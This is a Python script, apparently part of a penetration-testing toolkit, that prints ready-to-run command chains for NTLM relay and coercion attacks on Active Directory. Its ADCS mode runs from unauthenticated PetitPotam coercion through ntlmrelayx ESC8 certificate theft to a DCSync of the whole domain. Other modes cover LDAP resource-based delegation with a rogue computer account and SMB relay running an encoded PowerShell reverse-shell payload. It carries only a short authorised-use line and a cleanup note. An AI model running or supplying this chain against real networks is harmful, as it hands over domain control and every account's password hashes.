#!/usr/bin/env python3
"""NTLM RELAY + COERCION -> domain foothold / DA (no creds, or a low-priv cred). Drives ntlmrelayx +
coercion tools (PetitPotam/PrinterBug/DFSCoerce/Coercer). PRINTS commands. Authorized only — intrusive.

Chain: (Responder/mitm6 or a COERCED auth)  ->  ntlmrelayx  ->  a target that accepts relayed NTLM:
  LDAP  -> RBCD / shadow-cred / add-computer / dump          (needs LDAP signing NOT enforced)
  SMB   -> exec / secretsdump on another host               (needs SMB signing NOT enforced)
  ADCS  -> ESC8: enroll a cert as the victim (often a DC$)   -> PKINIT -> DA   (the headline path)
  MSSQL -> xp_cmdshell as the relayed identity

Usage:
  python3 gen_relay.py adcs   --dc 10.0.0.10 --ca-host 10.0.0.20 --target-dc DC01   # PetitPotam -> ESC8 -> DA
  python3 gen_relay.py ldap   --dc 10.0.0.10                                        # relay -> RBCD/add-computer
  python3 gen_relay.py smb    --targets targets.txt                                 # relay -> exec/secretsdump
  python3 gen_relay.py coerce --victim 10.0.0.30 --listener 10.0.0.100              # coercion triggers only
"""
import sys
import _network_common as P

def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

arg = sys.argv[1] if len(sys.argv) > 1 else "adcs"
dc      = opt("--dc", "<DC-IP>")
ca      = opt("--ca-host", "<ADCS-web-enroll-host>")
tdc     = opt("--target-dc", "DC01")
victim  = opt("--victim", "<victim-host>")
lstnr   = opt("--listener", P.LHOST)
targets = opt("--targets", "targets.txt")

print("# LEGEND:  <x> = you supply   ·   [T1]/[T2] = SEPARATE terminals, run at the SAME time   ·   -> ok: = what confirms it")
print("# GLOBAL PREREQ:  needs `ntlmrelayx.py` (impacket) + a coercion tool (PetitPotam/Coercer) installed (preflight.sh).")
print("#   if Responder is running, set SMB=Off + HTTP=Off in /etc/responder/Responder.conf so ntlmrelayx can bind port 445/80.")
print("#   find relay targets:  nxc smb <subnet> --gen-relay-list relay.txt   (only hosts with SMB signing OFF are relayable)\n")

if arg == "adcs":
    print(f"# ESC8 — coerce a DC to auth, relay its NTLM to the ADCS WEB ENROLLMENT, get a cert as the DC$ -> DA.")
    print(f"# needs: the CA has WEB ENROLLMENT on (browse http://{ca}/certsrv works) AND Extended Protection (EPA) is OFF.")
    print(f"#        NO credentials required for this chain.\n")
    print(f"# [T1] start the relay and LEAVE IT RUNNING (it waits for the coerced auth):")
    print(f"ntlmrelayx.py -t http://{ca}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController")
    print(f"\n# [T2] in a SECOND terminal, coerce the DC to authenticate to you (try in this order; first that works):")
    print(f"PetitPotam.py -u '' -p '' {lstnr} {dc}                     # MS-EFSRPC — NO CREDS (try this first)")
    print(f"Coercer coerce -u '' -p '' -t {dc} -l {lstnr}              # all methods, no-cred attempt")
    print(f"printerbug.py <domain>/<user>:<pass>@{dc} {lstnr}          # MS-RPRN — needs any domain cred")
    print(f"dfscoerce.py -u <user> -p <pass> {lstnr} {dc}              # MS-DFSNM — needs any domain cred")
    print(f"# -> ok: [T1] ntlmrelayx prints  'Base64 certificate of user DC01$'  — that blob is BASE64, not a pfx.")
    print(f"#    DECODE it first (certipy needs a real .pfx; saving the blob verbatim gives an invalid file):")
    print(f"echo '<base64-blob>' | base64 -d > dc.pfx")
    print(f"\n# [T1-done] turn the cert into the DC's NT hash / a TGT:")
    print(f"certipy auth -pfx dc.pfx -dc-ip {dc}                       # -> prints {tdc}$ NT hash + writes a .ccache")
    print(f"# then DCSync the whole domain with that hash = Domain Admin:")
    print(f"secretsdump.py -just-dc <domain>/'{tdc}$'@{dc} -hashes :<nt>")

elif arg == "ldap":
    print(f"# relay to LDAP(S) -> RBCD / add a computer you control.  needs: LDAP signing NOT enforced on the DC.")
    print(f"# [T1] start the relay (leave running):")
    print(f"ntlmrelayx.py -t ldaps://{dc} --delegate-access --no-dump             # sets up RBCD onto your fake computer")
    print(f"#   or:  ntlmrelayx.py -t ldaps://{dc} --add-computer 'EVILPC$' 'Passw0rd!'   # creates a computer account")
    print(f"# [T2] trigger the auth: coercion, Responder, or mitm6 (see gen_poison.py) — a COMPUTER account must auth.")
    print(f"# -> ok: relay reports the delegation/computer was written. Then abuse RBCD:")
    print(f"getST.py -spn cifs/{tdc} -impersonate administrator '<domain>/EVILPC$:Passw0rd!'   # S4U -> admin ticket for {tdc}")

elif arg == "smb":
    print(f"# relay to SMB on OTHER hosts -> exec / dump SAM.  needs: target SMB signing OFF + the relayed user is ADMIN there.")
    print(f"# [T1] start the relay (leave running); pick ONE action:")
    print(f"ntlmrelayx.py -tf {targets} -smb2support -c 'powershell -e <REV_B64>'   # action A: exec a command")
    print(f"ntlmrelayx.py -tf {targets} -smb2support                                # action B: dump SAM (default)")
    print(f"ntlmrelayx.py -tf {targets} -smb2support --enum-local-admins            # action C: find where you're admin")
    print(f"# [T2] trigger the auth (Responder with SMB/HTTP off, or coercion).")
    print(f"# -> ok: relay prints 'Authenticating against ... SUCCEED' then runs your action.")

elif arg == "coerce":
    print(f"# COERCION only — force {victim} to authenticate to {lstnr}. Pair with a relay/capture in ANOTHER terminal FIRST.")
    print(f"# no creds? use PetitPotam/Coercer with empty creds. Have any domain cred? any of these:")
    print(f"PetitPotam.py -u '' -p '' {lstnr} {victim}                 # MS-EFSRPC — NO CREDS (try first)")
    print(f"Coercer coerce -u '' -p '' -t {victim} -l {lstnr}          # all methods, no-cred attempt")
    print(f"printerbug.py <domain>/<user>:<pass>@{victim} {lstnr}      # MS-RPRN — needs a domain cred")
    print(f"dfscoerce.py -u <user> -p <pass> {lstnr} {victim}          # MS-DFSNM — needs a domain cred")
    print(f"# -> ok: your listening relay/Responder in the OTHER terminal shows an incoming auth from {victim}.")
else:
    print("use: adcs | ldap | smb | coerce"); sys.exit(1)

print(f"\n# SAFETY: relay + coercion are intrusive (they authenticate real accounts to you). Time-box, coordinate,")
print(f"#   and note that ADCS/RBCD changes (added computer, delegation) are ARTIFACTS to clean up (report --cleanup).")
